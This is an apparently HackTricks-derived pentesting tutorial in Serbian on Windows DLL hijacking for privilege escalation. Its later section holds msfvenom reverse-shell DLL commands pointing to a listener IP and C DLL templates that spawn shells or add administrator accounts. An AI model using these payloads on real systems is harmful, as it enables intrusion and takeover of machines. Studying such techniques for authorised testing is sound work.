# Dll Hijacking

{{#include ../../banners/hacktricks-training.md}}



## Basic Information

DLL Hijacking uključuje manipulaciju pouzdane aplikacije da učita zlonamerni DLL. Ovaj termin obuhvata nekoliko taktika kao što su **DLL Spoofing, Injection, i Side-Loading**. Uglavnom se koristi za izvršavanje koda, postizanje postojanosti i, ređe, eskalaciju privilegija. Iako je fokus ovde na eskalaciji, metoda hijackinga ostaje dosledna kroz ciljeve.

### Common Techniques

Nekoliko metoda se koristi za DLL hijacking, svaka sa svojom efikasnošću u zavisnosti od strategije učitavanja DLL-a aplikacije:

1. **DLL Replacement**: Zamena pravog DLL-a sa zlonamernim, opcionalno koristeći DLL Proxying da očuva funkcionalnost originalnog DLL-a.
2. **DLL Search Order Hijacking**: Postavljanje zlonamernog DLL-a u pretragu ispred legitimnog, iskorišćavajući obrazac pretrage aplikacije.
3. **Phantom DLL Hijacking**: Kreiranje zlonamernog DLL-a za aplikaciju da učita, misleći da je to nepostojeći potrebni DLL.
4. **DLL Redirection**: Modifikovanje pretraživačkih parametara kao što su `%PATH%` ili `.exe.manifest` / `.exe.local` datoteke da usmere aplikaciju na zlonamerni DLL.
5. **WinSxS DLL Replacement**: Zamena legitimnog DLL-a sa zlonamernim u WinSxS direktorijumu, metoda koja se često povezuje sa DLL side-loading.
6. **Relative Path DLL Hijacking**: Postavljanje zlonamernog DLL-a u direktorijum pod kontrolom korisnika sa kopiranom aplikacijom, podsećajući na tehnike Binary Proxy Execution.

## Finding missing Dlls

Najčešći način da se pronađu nedostajući DLL-ovi unutar sistema je pokretanje [procmon](https://docs.microsoft.com/en-us/sysinternals/downloads/procmon) iz sysinternals, **postavljajući** **sledeća 2 filtera**:

![](<../../images/image (311).png>)

![](<../../images/image (313).png>)

i samo prikazivanje **File System Activity**:

![](<../../images/image (314).png>)

Ako tražite **nedostajuće dll-ove uopšte**, možete **ostaviti** ovo da radi nekoliko **sekundi**.\
Ako tražite **nedostajući dll unutar specifične izvršne datoteke**, trebate postaviti **drugi filter kao "Process Name" "contains" "\<exec name>", izvršiti ga, i zaustaviti hvatanje događaja**.

## Exploiting Missing Dlls

Da bismo eskalirali privilegije, najbolja šansa koju imamo je da možemo **napisati dll koji će privilegovani proces pokušati da učita** na nekom **mestu gde će biti pretraživan**. Stoga, moći ćemo da **napišemo** dll u **folderu** gde se **dll pretražuje pre** foldera gde se **originalni dll** nalazi (čudan slučaj), ili ćemo moći da **pišemo u neki folder gde će se dll pretraživati** i originalni **dll ne postoji** u bilo kom folderu.

### Dll Search Order

**Unutar** [**Microsoft dokumentacije**](https://docs.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-search-order#factors-that-affect-searching) **možete pronaći kako se DLL-ovi učitavaju specifično.**

**Windows aplikacije** traže DLL-ove prateći set **pre-definisanih pretraživačkih puteva**, pridržavajući se određenog reda. Problem DLL hijacking-a nastaje kada se štetan DLL strateški postavi u jedan od ovih direktorijuma, osiguravajući da se učita pre autentičnog DLL-a. Rešenje za sprečavanje ovoga je osigurati da aplikacija koristi apsolutne puteve kada se poziva na DLL-ove koje zahteva.

Možete videti **DLL pretraživački redosled na 32-bitnim** sistemima ispod:

1. Direktorijum iz kojeg je aplikacija učitana.
2. Sistem direktorijum. Koristite [**GetSystemDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getsystemdirectorya) funkciju da dobijete putanju ovog direktorijuma.(_C:\Windows\System32_)
3. 16-bitni sistem direktorijum. Ne postoji funkcija koja dobija putanju ovog direktorijuma, ali se pretražuje. (_C:\Windows\System_)
4. Windows direktorijum. Koristite [**GetWindowsDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getwindowsdirectorya) funkciju da dobijete putanju ovog direktorijuma.
1. (_C:\Windows_)
5. Trenutni direktorijum.
6. Direktorijumi koji su navedeni u PATH promenljivoj okruženja. Imajte na umu da ovo ne uključuje putanju po aplikaciji koju određuje **App Paths** registry ključ. **App Paths** ključ se ne koristi prilikom izračunavanja DLL pretraživačkog puta.

To je **podrazumevani** pretraživački redosled sa **SafeDllSearchMode** omogućenim. Kada je on onemogućen, trenutni direktorijum se penje na drugo mesto. Da biste onemogućili ovu funkciju, kreirajte **HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Session Manager**\\**SafeDllSearchMode** registry vrednost i postavite je na 0 (podrazumevano je omogućeno).

Ako se pozove [**LoadLibraryEx**](https://docs.microsoft.com/en-us/windows/desktop/api/LibLoaderAPI/nf-libloaderapi-loadlibraryexa) funkcija sa **LOAD_WITH_ALTERED_SEARCH_PATH**, pretraga počinje u direktorijumu izvršnog modula koji **LoadLibraryEx** učitava.

Na kraju, imajte na umu da **dll može biti učitan ukazujući apsolutnu putanju umesto samo imena**. U tom slučaju, taj dll će se **samo pretraživati u toj putanji** (ako dll ima bilo kakve zavisnosti, one će se pretraživati kao da su učitane samo po imenu).

Postoje i drugi načini da se promene načini pretraživanja, ali ih neću objašnjavati ovde.

#### Exceptions on dll search order from Windows docs

Određene izuzetke od standardnog DLL pretraživačkog reda beleže Windows dokumenti:

- Kada se naiđe na **DLL koji deli svoje ime sa jednim već učitanim u memoriji**, sistem zaobilazi uobičajenu pretragu. Umesto toga, vrši proveru za preusmeravanje i manifest pre nego što se vrati na DLL već u memoriji. **U ovom scenariju, sistem ne sprovodi pretragu za DLL**.
- U slučajevima kada je DLL prepoznat kao **poznati DLL** za trenutnu verziju Windows-a, sistem će koristiti svoju verziju poznatog DLL-a, zajedno sa bilo kojim njegovim zavisnim DLL-ovima, **preskočivši proces pretrage**. Registry ključ **HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs** sadrži listu ovih poznatih DLL-ova.
- Ako **DLL ima zavisnosti**, pretraga za tim zavisnim DLL-ovima se sprovodi kao da su označeni samo svojim **imenima modula**, bez obzira na to da li je inicijalni DLL identifikovan putem pune putanje.

### Escalating Privileges

**Zahtevi**:

- Identifikujte proces koji radi ili će raditi pod **različitim privilegijama** (horizontalno ili lateralno kretanje), koji **nema DLL**.
- Osigurajte da je **pristup za pisanje** dostupan za bilo koji **direktorijum** u kojem će se **DLL** **pretraživati**. Ova lokacija može biti direktorijum izvršne datoteke ili direktorijum unutar sistemskog puta.

Da, zahtevi su komplikovani za pronalaženje jer je **po defaultu čudno pronaći privilegovanu izvršnu datoteku bez dll-a** i još je **čudnije imati dozvole za pisanje u folderu sistemskog puta** (po defaultu ne možete). Ali, u pogrešno konfigurisanim okruženjima ovo je moguće.\
U slučaju da imate sreće i ispunjavate zahteve, možete proveriti [UACME](https://github.com/hfiref0x/UACME) projekat. Čak i ako je **glavni cilj projekta zaobilaženje UAC**, možete pronaći **PoC** DLL hijacking-a za verziju Windows-a koju možete koristiti (verovatno samo menjajući putanju foldera gde imate dozvole za pisanje).

Imajte na umu da možete **proveriti svoje dozvole u folderu** tako što ćete:
```bash
accesschk.exe -dqv "C:\Python27"
icacls "C:\Python27"
```
I **proverite dozvole svih foldera unutar PATH**:
```bash
for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
```
Možete takođe proveriti uvoze izvršne datoteke i izvoze dll-a sa:
```c
dumpbin /imports C:\path\Tools\putty\Putty.exe
dumpbin /export /path/file.dll
```
Za potpuni vodič o tome kako **zloupotrebiti Dll Hijacking za eskalaciju privilegija** sa dozvolama za pisanje u **System Path folder**, proverite:

{{#ref}}
dll-hijacking/writable-sys-path-+dll-hijacking-privesc.md
{{#endref}}

### Automatizovani alati

[**Winpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS) će proveriti da li imate dozvole za pisanje u bilo kom folderu unutar sistemskog PATH-a.\
Drugi zanimljivi automatizovani alati za otkrivanje ove ranjivosti su **PowerSploit funkcije**: _Find-ProcessDLLHijack_, _Find-PathDLLHijack_ i _Write-HijackDll._

### Primer

U slučaju da pronađete scenario koji se može iskoristiti, jedna od najvažnijih stvari za uspešno iskorišćavanje bi bila da **napravite dll koji izvozi barem sve funkcije koje će izvršni program uvesti iz njega**. U svakom slučaju, imajte na umu da Dll Hijacking dolazi u obzir kako bi se [eskaliralo sa Medium Integrity nivoa na High **(zaobilaženje UAC)**](../authentication-credentials-uac-and-efs.md#uac) ili sa [**High Integrity na SYSTEM**](./#from-high-integrity-to-system)**.** Možete pronaći primer **kako napraviti validan dll** unutar ove studije o dll hijacking-u fokusirane na dll hijacking za izvršavanje: [**https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows**](https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows)**.**\
Pored toga, u **sledećoj sekciji** možete pronaći neke **osnovne dll kodove** koji bi mogli biti korisni kao **šabloni** ili za kreiranje **dll-a sa neobaveznim izvezenim funkcijama**.

## **Kreiranje i kompajliranje Dll-ova**

### **Dll Proxifying**

U suštini, **Dll proxy** je Dll sposoban da **izvrši vaš zlonamerni kod kada se učita**, ali takođe da **izloži** i **radi** kao **očekivano** tako što **preusmerava sve pozive na pravu biblioteku**.

Sa alatom [**DLLirant**](https://github.com/redteamsocietegenerale/DLLirant) ili [**Spartacus**](https://github.com/Accenture/Spartacus) možete zapravo **naznačiti izvršni program i odabrati biblioteku** koju želite da proxifikuje i **generisati proxifikovani dll** ili **naznačiti Dll** i **generisati proxifikovani dll**.

### **Meterpreter**

**Dobijte rev shell (x64):**
```bash
msfvenom -p windows/x64/shell/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```
**Dobijte meterpreter (x86):**
```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```
**Kreirajte korisnika (x86 nisam video x64 verziju):**
```
msfvenom -p windows/adduser USER=privesc PASS=Attacker@123 -f dll -o msf.dll
```
### Vaš

Napomena da u nekoliko slučajeva Dll koji kompajlirate mora **izvoziti nekoliko funkcija** koje će biti učitane od strane procesa žrtve, ako ove funkcije ne postoje **binarni fajl neće moći da ih učita** i **eksploit će propasti**.
```c
// Tested in Win10
// i686-w64-mingw32-g++ dll.c -lws2_32 -o srrstr.dll -shared
#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
switch(dwReason){
case DLL_PROCESS_ATTACH:
system("whoami > C:\\users\\username\\whoami.txt");
WinExec("calc.exe", 0); //This doesn't accept redirections like system
break;
case DLL_PROCESS_DETACH:
break;
case DLL_THREAD_ATTACH:
break;
case DLL_THREAD_DETACH:
break;
}
return TRUE;
}
```

```c
// For x64 compile with: x86_64-w64-mingw32-gcc windows_dll.c -shared -o output.dll
// For x86 compile with: i686-w64-mingw32-gcc windows_dll.c -shared -o output.dll

#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
if (dwReason == DLL_PROCESS_ATTACH){
system("cmd.exe /k net localgroup administrators user /add");
ExitProcess(0);
}
return TRUE;
}
```

```c
//x86_64-w64-mingw32-g++ -c -DBUILDING_EXAMPLE_DLL main.cpp
//x86_64-w64-mingw32-g++ -shared -o main.dll main.o -Wl,--out-implib,main.a

#include <windows.h>

int owned()
{
WinExec("cmd.exe /c net user cybervaca Password01 ; net localgroup administrators cybervaca /add", 0);
exit(0);
return 0;
}

BOOL WINAPI DllMain(HINSTANCE hinstDLL,DWORD fdwReason, LPVOID lpvReserved)
{
owned();
return 0;
}
```

```c
//Another possible DLL
// i686-w64-mingw32-gcc windows_dll.c -shared -lws2_32 -o output.dll

#include<windows.h>
#include<stdlib.h>
#include<stdio.h>

void Entry (){ //Default function that is executed when the DLL is loaded
system("cmd");
}

BOOL APIENTRY DllMain (HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
switch (ul_reason_for_call){
case DLL_PROCESS_ATTACH:
CreateThread(0,0, (LPTHREAD_START_ROUTINE)Entry,0,0,0);
break;
case DLL_THREAD_ATTACH:
case DLL_THREAD_DETACH:
case DLL_PROCESS_DEATCH:
break;
}
return TRUE;
}
```
## Reference

- [https://medium.com/@pranaybafna/tcapt-dll-hijacking-888d181ede8e](https://medium.com/@pranaybafna/tcapt-dll-hijacking-888d181ede8e)
- [https://cocomelonc.github.io/pentest/2021/09/24/dll-hijacking-1.html](https://cocomelonc.github.io/pentest/2021/09/24/dll-hijacking-1.html)



{{#include ../../banners/hacktricks-training.md}}
